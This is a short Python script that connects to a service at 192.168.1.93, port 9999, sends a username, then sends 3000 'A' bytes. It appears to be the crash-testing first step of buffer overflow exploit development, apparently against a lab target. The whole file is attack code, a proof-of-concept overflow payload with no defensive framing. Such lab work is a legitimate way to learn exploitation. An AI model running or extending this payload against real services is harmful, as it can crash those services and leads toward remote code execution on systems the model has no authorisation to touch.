import socket, struct



host, port = '192.168.1.93', 9999

username = b'Generic User'
next_prompt = b'\r\n'
payload = b''.join([
b'A'*3000


])




with socket.socket() as s:
        s.connect((host,port))
        s.recv(1024)
        s.send(username + next_prompt)
        s.recv(1024)
        s.send(payload + next_prompt)
